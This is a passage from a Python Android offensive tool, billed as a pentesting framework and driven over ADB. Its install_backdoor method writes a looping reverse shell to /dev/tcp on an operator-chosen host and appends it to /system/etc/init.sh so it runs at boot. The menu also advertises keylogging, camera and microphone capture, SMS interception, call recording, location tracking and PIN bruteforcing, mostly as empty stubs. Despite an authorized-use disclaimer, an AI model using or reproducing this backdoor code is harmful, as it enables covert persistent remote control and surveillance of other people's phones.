                # Extract to backup directory
                extract_dir = Config.BACKUP_DIR / "apks" / package
                extract_dir.mkdir(parents=True, exist_ok=True)
                
                self.run_command(f"pull {apk_path} {extract_dir}/")
                
                # Decompile if apktool is available
                apktool = shutil.which("apktool")
                if apktool:
                    decompiled_dir = extract_dir / "decompiled"
                    subprocess.run([apktool, "d", f"{extract_dir}/{apk_path.split('/')[-1]}", 
                                  "-o", decompiled_dir], capture_output=True)
                
                self.log(f"APK extracted to {extract_dir}", "SUCCESS")
                results.update({"success": True, "directory": str(extract_dir)})
        
        return results
    
    def install_backdoor(self, options: dict = None) -> dict:
        """
        Install persistent backdoor
        
        Args:
            options: Backdoor options
            
        Returns:
            Result dictionary
        """
        results = {"success": False}
        
        if not self.root_access:
            self.log("Root access required for backdoor", "ERROR")
            return results
        
        backdoor_types = [
            ("reverse_shell", "Reverse shell connection"),
            ("web_socket", "WebSocket backdoor"),
            ("ssh", "SSH server"),
            ("vpn", "VPN-based backdoor"),
            ("broadcast_receiver", "Broadcast receiver"),
            ("accessibility", "Accessibility service")
        ]
        
        print(Config.colorize("\n[BACKDOOR INSTALLATION]", "HEADER"))
        for i, (btype, desc) in enumerate(backdoor_types, 1):
            print(f"{i}. {desc}")
        
        choice = input("\nSelect backdoor type (1-6): ").strip()
        
        if choice == "1":  # Reverse shell
            # Create reverse shell script
            lhost = input("Local IP: ").strip()
            lport = input("Local port: ").strip() or "4444"
            
            shell_script = f'''#!/system/bin/sh
while true; do
    /system/bin/sh -i &>/dev/tcp/{lhost}/{lport} 0>&1
    sleep 30
done'''
            
            # Push to device
            self.run_command(f"shell 'echo \"{shell_script}\" > /data/local/tmp/backdoor.sh'")
            self.run_command("shell chmod 755 /data/local/tmp/backdoor.sh")
            
            # Add to startup
            self.run_command(f"shell 'echo \"/data/local/tmp/backdoor.sh &\" >> /system/etc/init.sh'")
            
            self.log("Reverse shell backdoor installed", "SUCCESS")
            results.update({"success": True, "type": "reverse_shell"})
        
        self.backdoor_installed = True
        return results
    
    def system_information(self, options: dict = None) -> dict:
        """
        Gather detailed system information
        
        Args:
            options: Info gathering options
            
        Returns:
            Result dictionary
        """
        results = {"success": False, "info": {}}
        
        categories = [
            ("system", "System properties"),
            ("build", "Build properties"),
            ("hardware", "Hardware information"),
            ("network", "Network configuration"),
            ("storage", "Storage information"),
            ("battery", "Battery status"),
            ("sensors", "Available sensors"),
            ("features", "System features"),
            ("libraries", "Shared libraries"),
            ("environment", "Environment variables")
        ]
        
        print(Config.colorize("\n[SYSTEM INFORMATION]", "HEADER"))
        for i, (cat, desc) in enumerate(categories, 1):
            print(f"{i}. {desc}")
        
        print(f"{len(categories)+1}. All information")
        
        choice = input(f"\nSelect category (1-{len(categories)+1}): ").strip()
        
        info = {}
        
        if choice == str(len(categories) + 1):  # All
            for cat, _ in categories:
                info[cat] = self._gather_system_category(cat)
        else:
            idx = int(choice) - 1
            if 0 <= idx < len(categories):
                cat, _ = categories[idx]
                info[cat] = self._gather_system_category(cat)
        
        # Display information
        for category, data in info.items():
            print(f"\n{'='*60}")
            print(f"{category.upper()} INFORMATION")
            print(f"{'='*60}")
            if isinstance(data, dict):
                for key, value in data.items():
                    print(f"{key:<30}: {value}")
            elif isinstance(data, str):
                print(data)
        
        # Save to file
        info_file = Config.LOG_DIR / f"system_info_{self.device_serial}.json"
        with open(info_file, 'w') as f:
            json.dump(info, f, indent=2)
        
        results.update({"success": True, "info": info, "file": str(info_file)})
        return results
    
    def _gather_system_category(self, category: str):
        """Gather specific category of system information"""
        if category == "system":
            commands = {
                "Kernel": "uname -a",
                "Uptime": "uptime",
                "Load Average": "cat /proc/loadavg",
                "Memory": "free -m",
                "Processes": "ps -A | wc -l"
            }
        elif category == "build":
            commands = {
                prop: f"getprop {prop}" for prop in [
                    "ro.build.version.sdk",
                    "ro.build.version.release",
                    "ro.build.version.security_patch",
                    "ro.build.date",
                    "ro.build.type",
                    "ro.build.tags",
                    "ro.build.user",
                    "ro.build.host",
                    "ro.build.flavor",
                    "ro.build.description"
                ]
            }
        elif category == "hardware":
            commands = {
                "CPU": "cat /proc/cpuinfo | grep -i processor | wc -l",
                "CPU Info": "cat /proc/cpuinfo | grep -i model",
                "Memory Details": "cat /proc/meminfo",
                "Storage": "df -h",
                "Battery": "dumpsys battery | grep -E 'level|scale|voltage|temperature'"
            }
        elif category == "network":
            commands = {
                "IP Addresses": "ip addr show",
                "Routing": "ip route show",
                "DNS": "getprop | grep dns",
                "WiFi": "dumpsys wifi | grep -A5 -B5 'current'",
                "Bluetooth": "dumpsys bluetooth_manager | grep -A10 'Adapter'"
            }
        
        results = {}
        for key, cmd in commands.items():
            result = self.run_command(f"shell {cmd}")
            if result and result.returncode == 0:
                results[key] = result.stdout.strip()
        
        return results
    
    def vulnerability_scanning(self, options: dict = None) -> dict:
        """
        Scan for known vulnerabilities
        
        Args:
            options: Scan options
            
        Returns:
            Result dictionary
        """
        results = {"success": False, "vulnerabilities": []}
        
        if not self.root_access:
            self.log("Root access recommended for vulnerability scanning", "WARNING")
        
        vulnerabilities = [
            {
                "name": "Dirty COW (CVE-2016-5195)",
                "check": "uname -r",
                "condition": lambda x: any(ver in x for ver in ["3.18", "4.4", "4.8"]),
                "severity": "Critical"
            },
            {
                "name": "QuadRooter (CVE-2016-2503)",
                "check": "getprop ro.build.fingerprint",
                "condition": lambda x: "kernel" in x.lower(),
                "severity": "High"
            },
            {
                "name": "Stagefright (CVE-2015-1538)",
                "check": "getprop ro.build.version.sdk",
                "condition": lambda x: int(x) < 23,
                "severity": "Critical"
            },
            {
                "name": "Master Key (CVE-2013-4787)",
                "check": "getprop ro.build.version.sdk",
                "condition": lambda x: int(x) < 18,
                "severity": "High"
            },
            {
                "name": "Fake ID (CVE-2014-7911)",
                "check": "getprop ro.build.version.sdk",
                "condition": lambda x: int(x) < 21,
                "severity": "High"
            },
            {
                "name": "ADB Debug Enabled",
                "check": "getprop ro.debuggable",
                "condition": lambda x: x == "1",
                "severity": "Medium"
            },
            {
                "name": "USB Debug Enabled",
                "check": "settings get global adb_enabled",
                "condition": lambda x: x == "1",
                "severity": "Low"
            },
            {
                "name": "Unknown Sources Allowed",
                "check": "settings get secure install_non_market_apps",
                "condition": lambda x: x == "1",
                "severity": "Medium"
            }
        ]
        
        print(Config.colorize("\n[VULNERABILITY SCANNING]", "HEADER"))
        print("Scanning for known vulnerabilities...")
        
        found = []
        for vuln in vulnerabilities:
            result = self.run_command(f"shell {vuln['check']}")
            if result and result.returncode == 0:
                output = result.stdout.strip()
                if vuln['condition'](output):
                    found.append({
                        "name": vuln["name"],
                        "severity": vuln["severity"],
                        "details": output
                    })
                    
                    severity_color = {
                        "Critical": "RED",
                        "High": "YELLOW",
                        "Medium": "CYAN",
                        "Low": "BLUE"
                    }.get(vuln["severity"], "WHITE")
                    
                    print(Config.colorize(
                        f"[{vuln['severity']}] {vuln['name']}: {output}",
                        severity_color
                    ))
        
        if not found:
            print(Config.colorize("No known vulnerabilities found", "GREEN"))
        
        # Save results
        scan_file = Config.LOG_DIR / f"vuln_scan_{self.device_serial}.json"
        with open(scan_file, 'w') as f:
            json.dump(found, f, indent=2)
        
        results.update({
            "success": True,
            "vulnerabilities": found,
            "file": str(scan_file)
        })
        
        return results
    
    # ============================================================================
    # ADDITIONAL MODULE IMPLEMENTATIONS (simplified)
    # ============================================================================
    
    def root_exploitation(self, options: dict = None) -> dict:
        """Attempt root exploitation"""
        self.log("Root exploitation module", "INFO")
        # Implement specific root exploits
        return {"success": False}
    
    def full_backup(self, options: dict = None) -> dict:
        """Create full device backup"""
        self.log("Full backup module", "INFO")
        return {"success": False}
    
    def analyze_packages(self, options: dict = None) -> dict:
        """Analyze installed packages"""
        self.log("Package analysis module", "INFO")
        return {"success": False}
    
    def camera_access(self, options: dict = None) -> dict:
        """Access device cameras"""
        self.log("Camera access module", "INFO")
        return {"success": False}
    
    def mic_recording(self, options: dict = None) -> dict:
        """Record from microphone"""
        self.log("Microphone recording module", "INFO")
        return {"success": False}
    
    def sms_interception(self, options: dict = None) -> dict:
        """Intercept SMS"""
        self.log("SMS interception module", "INFO")
        return {"success": False}
    
    def call_recording(self, options: dict = None) -> dict:
        """Record phone calls"""
        self.log("Call recording module", "INFO")
        return {"success": False}
    
    def location_tracking(self, options: dict = None) -> dict:
        """Track location"""
        self.log("Location tracking module", "INFO")
        return {"success": False}
    
    def establish_persistence(self, options: dict = None) -> dict:
        """Establish persistence"""
        self.log("Persistence module", "INFO")
        return {"success": False}
    
    def privilege_escalation(self, options: dict = None) -> dict:
        """Privilege escalation"""
        self.log("Privilege escalation module", "INFO")
        return {"success": False}
    
    def network_information(self, options: dict = None) -> dict:
        """Gather network info"""
        self.log("Network information module", "INFO")
        return {"success": False}
    
    def port_scanning(self, options: dict = None) -> dict:
        """Port scanning"""
        self.log("Port scanning module", "INFO")
        return {"success": False}
    
    def packet_capture(self, options: dict = None) -> dict:
        """Packet capture"""
        self.log("Packet capture module", "INFO")
        return {"success": False}
    
    def file_manager(self, options: dict = None) -> dict:
        """File manager"""
        self.log("File manager module", "INFO")
        return {"success": False}
    
    def process_manager(self, options: dict = None) -> dict:
        """Process manager"""
        self.log("Process manager module", "INFO")
        return {"success": False}
    
    def bruteforce_pin(self, options: dict = None) -> dict:
        """Bruteforce PIN"""
        self.log("PIN bruteforce module", "INFO")
        return {"success": False}
    
    # ============================================================================
    # FRAMEWORK MANAGEMENT
    # ============================================================================
    
    def show_menu(self):
        """Display main menu"""
        while True:
            print(Config.colorize("\n" + "="*70, "BLUE"))
            print(Config.colorize("ANDROID PENTESTING FRAMEWORK - MAIN MENU", "HEADER"))
            print(Config.colorize("="*70, "BLUE"))
            
            print(f"Device: {self.device_serial or 'Not connected'}")
            print(f"Status: {'Connected' if self.connected else 'Disconnected'}")
            print(f"Root: {'Available' if self.root_access else 'Not available'}")
            print(f"Session: {self.session_id}")
            print(Config.colorize("-"*70, "BLUE"))
            
            categories = {
                "CONNECTION": ["Connect device", "Disconnect", "List devices", "Device info"],
                "EXPLOITATION": ["Lock screen bypass", "Root exploitation", "Vulnerability scan"],
                "SURVEILLANCE": ["Screen mirroring", "Screen recording", "Screenshot", 
                               "Keylogger", "Camera access", "Microphone recording"],
                "FORENSICS": ["File extraction", "Full backup", "Package analysis"],
                "POST-EXPLOIT": ["Backdoor installation", "Persistence", "Privilege escalation"],
                "NETWORK": ["WiFi control", "Network info", "Port scanning", "Packet capture"],
                "UTILITIES": ["Interactive shell", "App manager", "File manager", 
                            "Process manager", "System information", "PIN bruteforce"],
                "FRAMEWORK": ["Session info", "Save session", "Load session", "Exit"]
            }
            
            # Display categories
            for i, (category, items) in enumerate(categories.items(), 1):
                print(Config.colorize(f"\n[{i}] {category}", "YELLOW"))
                for j, item in enumerate(items, 1):
                    print(f"    {i}.{j} {item}")
            
            print(Config.colorize("\n[0] Exit framework", "RED"))
            
            choice = input(Config.colorize("\nSelect option (e.g., 2.3): ", "GREEN")).strip()
            
            if choice == "0":
                self.exit_framework()
                break
            
            # Handle category.item selection
            if '.' in choice:
                cat_part, item_part = choice.split('.')
                try:
                    cat_idx = int(cat_part) - 1
                    item_idx = int(item_part) - 1
                    
                    categories_list = list(categories.keys())
                    if 0 <= cat_idx < len(categories_list):
                        category = categories_list[cat_idx]
                        items = categories[category]
                        
                        if 0 <= item_idx < len(items):
                            self.execute_menu_item(category, items[item_idx])
                        else:
                            self.log("Invalid item selection", "ERROR")
                    else:
                        self.log("Invalid category selection", "ERROR")
                
                except ValueError:
                    self.log("Invalid selection format", "ERROR")
            else:
                self.log("Use format category.item (e.g., 1.2)", "ERROR")
    
    def execute_menu_item(self, category: str, item: str):
        """Execute selected menu item"""
        module_map = {
            "Connect device": lambda: self.connect_menu(),
            "Disconnect": lambda: self.disconnect_device(),
            "List devices": lambda: self.list_devices_menu(),
            "Device info": lambda: self.show_device_info(),
            "Lock screen bypass": lambda: self.modules['lock_bypass'].function(),
            "Root exploitation": lambda: self.modules['root_exploit'].function(),
            "Vulnerability scan": lambda: self.modules['vulnerability_scan'].function(),
            "Screen mirroring": lambda: self.modules['screen_mirror'].function(),
            "Screen recording": lambda: self.modules['screen_record'].function(),
            "Screenshot": lambda: self.modules['take_screenshot'].function(),
            "Keylogger": lambda: self.modules['keylogger'].function(),
            "Camera access": lambda: self.modules['camera_access'].function(),
            "Microphone recording": lambda: self.modules['mic_recording'].function(),
            "File extraction": lambda: self.modules['extract_files'].function(),
            "Full backup": lambda: self.modules['backup_data'].function(),
            "Package analysis": lambda: self.modules['analyze_packages'].function(),
            "Backdoor installation": lambda: self.modules['install_backdoor'].function(),
            "Persistence": lambda: self.modules['persistence'].function(),
            "Privilege escalation": lambda: self.modules['privilege_escalation'].function(),
            "WiFi control": lambda: self.modules['wifi_control'].function(),
            "Network info": lambda: self.modules['network_info'].function(),
            "Port scanning": lambda: self.modules['port_scanning'].function(),
            "Packet capture": lambda: self.modules['packet_capture'].function(),
            "Interactive shell": lambda: self.modules['shell_access'].function(),
            "App manager": lambda: self.modules['app_manager'].function(),
            "File manager": lambda: self.modules['file_manager'].function(),
            "Process manager": lambda: self.modules['process_manager'].function(),
            "System information": lambda: self.modules['system_info'].function(),
            "PIN bruteforce": lambda: self.modules['bruteforce_pin'].function(),
            "Session info": lambda: self.show_session_info(),
            "Save session": lambda: self.save_session(),
            "Load session": lambda: self.load_session(),
            "Exit": lambda: self.exit_framework()
        }
        
        if item in module_map:
            module_map[item]()
        else:
            self.log(f"Module not found: {item}", "ERROR")
    
    def connect_menu(self):
        """Connect to device menu"""
        devices = self.list_devices()
        
        if not devices:
            self.log("No devices found", "ERROR")
            return
        
        print(Config.colorize("\n[CONNECT DEVICE]", "HEADER"))
        for i, (serial, status) in enumerate(devices, 1):
            status_color = "GREEN" if status == "device" else "YELLOW"
            print(f"{i}. {serial} ({Config.colorize(status, status_color)})")
        
        print(f"{len(devices)+1}. Enter serial manually")
        print(f"{len(devices)+2}. Auto-connect first authorized")
        
        choice = input(f"\nSelect device (1-{len(devices)+2}): ").strip()
        
        if choice == str(len(devices) + 1):
            serial = input("Device serial: ").strip()
            self.connect_device(serial)
        
        elif choice == str(len(devices) + 2):
            authorized = [d for d in devices if d[1] == "device"]
            if authorized:
                self.connect_device(authorized[0][0])
            else:
                self.log("No authorized devices found", "ERROR")
        
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(devices):
                    self.connect_device(devices[idx][0])
            except ValueError:
                self.log("Invalid selection", "ERROR")
    
    def list_devices_menu(self):
        """List devices with details"""
        devices = self.list_devices()
        
        if not devices:
            print("No devices found")
            return
        
        print(Config.colorize("\n[CONNECTED DEVICES]", "HEADER"))
        for serial, status in devices:
            status_color = "GREEN" if status == "device" else "YELLOW"
            print(f"Serial: {serial}")
            print(f"Status: {Config.colorize(status, status_color)}")
            
            # Get device model if connected
            if status == "device":
                result = self.run_command(f"-s {serial} shell getprop ro.product.model", 
                                        device_specific=False)
                if result:
                    print(f"Model: {result.stdout.strip()}")
            
            print("-" * 50)
    
    def show_device_info(self):
        """Display device information"""
        if not self.device_info:
            self.log("No device information available", "ERROR")
            return
        
        print(Config.colorize("\n[DEVICE INFORMATION]", "HEADER"))
        for key, value in self.device_info.items():
            print(Config.colorize(f"\n{key.upper()}:", "YELLOW"))
            print(value[:500])  # Limit output
        
        info_file = Config.LOG_DIR / f"device_info_{self.device_serial}.json"
        if info_file.exists():
            print(f"\nFull information saved to: {info_file}")
    
    def disconnect_device(self):
        """Disconnect from current device"""
        if self.device_serial:
            self.log(f"Disconnected from {self.device_serial}", "INFO")
            self.device_serial = None
            self.connected = False
            self.root_access = False
            self.device_info = {}
        else:
            self.log("No device connected", "WARNING")
    
    def reboot_device(self, mode: str = "normal"):
        """Reboot device"""
        modes = {
            "normal": "",
            "recovery": "recovery",
            "bootloader": "bootloader",
            "sideload": "sideload",
            "fastboot": "bootloader"
        }
        
        if mode in modes:
            cmd = f"reboot {modes[mode]}" if modes[mode] else "reboot"
            self.run_command(cmd)
            self.log(f"Device rebooting to {mode} mode", "INFO")
    
    def show_session_info(self):
        """Display session information"""
        print(Config.colorize("\n[SESSION INFORMATION]", "HEADER"))
        print(f"Session ID: {self.session_id}")
        print(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Device: {self.device_serial or 'None'}")
        print(f"Connected: {self.connected}")
        print(f"Root Access: {self.root_access}")
        print(f"Modules Executed: {len(self.module_results)}")
        print(f"Log Entries: {len(self.session_log)}")
        
        if self.module_results:
            print("\nModule Results:")
            for module, result in self.module_results.items():
                status = "✓" if result.get("success", False) else "✗"
                print(f"  {status} {module}")
        
        print(f"\nSession file: {self.session_file}")
    
    def save_session(self):
        """Save current session to file"""
        session_data = {
            "session_id": self.session_id,
            "device_serial": self.device_serial,
            "device_info": self.device_info,
            "connected": self.connected,
            "root_access": self.root_access,
            "module_results": self.module_results,
            "session_log": self.session_log,
            "timestamp": datetime.now().isoformat()
        }
        
        with open(self.session_file, 'w') as f:
            json.dump(session_data, f, indent=2, default=str)
        
        self.log(f"Session saved to {self.session_file}", "SUCCESS")
    
    def load_session(self, session_file: Path = None):
        """Load session from file"""
        if not session_file:
            # List available sessions
            sessions = list(Config.LOG_DIR.glob("session_*.json"))
            if not sessions:
                self.log("No saved sessions found", "ERROR")
                return
            
            print(Config.colorize("\n[LOAD SESSION]", "HEADER"))
            for i, session in enumerate(sessions, 1):
                print(f"{i}. {session.stem}")
            
            choice = input(f"\nSelect session (1-{len(sessions)}): ").strip()
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(sessions):
                    session_file = sessions[idx]
                else:
                    self.log("Invalid selection", "ERROR")
                    return
            except ValueError:
                self.log("Invalid input", "ERROR")
                return
        
        try:
            with open(session_file, 'r') as f:
                session_data = json.load(f)
            
            self.session_id = session_data.get("session_id", self.session_id)
            self.device_serial = session_data.get("device_serial")
            self.device_info = session_data.get("device_info", {})
            self.connected = session_data.get("connected", False)
            self.root_access = session_data.get("root_access", False)
            self.module_results = session_data.get("module_results", {})
            self.session_log = session_data.get("session_log", [])
            
            self.log(f"Session loaded from {session_file}", "SUCCESS")
            
        except Exception as e:
            self.log(f"Failed to load session: {e}", "ERROR")
    
    def exit_framework(self):
        """Clean exit from framework"""
        print(Config.colorize("\n[EXITING FRAMEWORK]", "HEADER"))
        
        # Stop any running services
        if self.recording:
            self.log("Stopping screen recording...", "INFO")
        
        if self.mirroring:
            self.log("Stopping screen mirroring...", "INFO")
        
        if self.keylogger_running:
            self.log("Stopping keylogger...", "INFO")
        
        # Save session
        save = input("Save current session? (y/n): ").lower()
        if save == 'y':
            self.save_session()
        
        print(Config.colorize("\nThank you for using Android Pentesting Framework", "GREEN"))
        print("Remember: Use this tool only for authorized security testing")
        sys.exit(0)

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Android Pentesting Framework (APF)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                          # Interactive mode
  %(prog)s --connect ABC123         # Connect to specific device
  %(prog)s --list-devices           # List connected devices
  %(prog)s --module lock_bypass     # Run specific module
  %(prog)s --verbose                # Enable verbose output
  %(prog)s --adb /path/to/adb       # Use custom ADB path
        """
    )
    
    parser.add_argument("-c", "--connect", help="Connect to device by serial")
    parser.add_argument("-l", "--list-devices", action="store_true", help="List connected devices")
    parser.add_argument("-m", "--module", help="Run specific module")
    parser.add_argument("-a", "--adb", default="adb", help="Path to ADB binary")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-s", "--session", help="Load session from file")
    parser.add_argument("--check-deps", action="store_true", help="Check dependencies")
    
    args = parser.parse_args()
    
    # Check dependencies
    if args.check_deps:
        print(Config.colorize("\n[DEPENDENCY CHECK]", "HEADER"))
        print(f"Python: {sys.version}")
        print(f"OpenCV: {'Available' if OPENCV_AVAILABLE else 'Not available (optional)'}")
        print(f"PIL: {'Available' if PIL_AVAILABLE else 'Not available (optional)'}")
        print(f"Paramiko: {'Available' if PARAMIKO_AVAILABLE else 'Not available (optional)'}")
        
        # Check ADB
        try:
            subprocess.run([args.adb, "version"], capture_output=True, check=True)
            print(f"ADB: Available at {args.adb}")
        except:
            print(f"ADB: Not found at {args.adb}")
        
        return
    
    # Create framework instance
    framework = AndroidPentestFramework(adb_path=args.adb, verbose=args.verbose)
    
    # Check ADB
    if not framework.check_adb():
        print(Config.colorize("ERROR: ADB not found or not working", "RED"))
        print(f"Check if ADB is installed and in PATH, or specify with --adb")
        sys.exit(1)
    
    # Load session if specified
    if args.session:
        framework.load_session(Path(args.session))
    
    # List devices mode
    if args.list_devices:
        devices = framework.list_devices()
        if devices:
            print(Config.colorize("\nConnected Android devices:", "HEADER"))
            for serial, status in devices:
                print(f"  {serial:<20} [{status}]")
        else:
            print("No devices found")
        return
    
    # Module execution mode
    if args.module:
        if args.connect:
            if not framework.connect_device(args.connect):
                sys.exit(1)
        
        if framework.connected:
            if args.module in framework.modules:
                module = framework.modules[args.module]
                print(Config.colorize(f"\nRunning module: {module.name}", "HEADER"))
                result = module.function()
                print(f"\nResult: {result}")
            else:
                print(f"Module not found: {args.module}")
                print(f"Available modules: {', '.join(framework.modules.keys())}")
        else:
            print("Not connected to device. Use --connect or connect interactively")
        return
    
    # Connect to specific device
    if args.connect:
        if not framework.connect_device(args.connect):
            sys.exit(1)
    
    # Interactive mode
    framework.show_menu()

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def check_root():
    """Check if script is running as root"""
    return os.geteuid() == 0

def print_banner():
    """Print framework banner"""
    banner = r"""
     █████╗ ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔════╝
    ███████║██████╔╝█████╗  
    ██╔══██║██╔═══╝ ██╔══╝  
    ██║  ██║██║     ███████╗
    ╚═╝  ╚═╝╚═╝     ╚══════╝
    Android Pentesting Framework v2.0
    """
    print(Config.colorize(banner, "CYAN"))

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    try:
        print_banner()
        
        # Warning
        warning = """
⚠️  WARNING: This tool is for authorized security testing only.
   Use only on devices you own or have explicit permission to test.
   The authors are not responsible for any unauthorized use.
        
Do you understand and accept these terms? (yes/no): """
        
        response = input(Config.colorize(warning, "RED")).strip().lower()
        if response != "yes":
            print("Exiting...")
            sys.exit(0)
        
        # Run main
        main()
        
    except KeyboardInterrupt:
        print(Config.colorize("\n\nInterrupted by user", "YELLOW"))
        sys.exit(0)
    except Exception as e:
        print(Config.colorize(f"\nFatal error: {e}", "RED"))
        import traceback
        traceback.print_exc()
        sys.exit(1)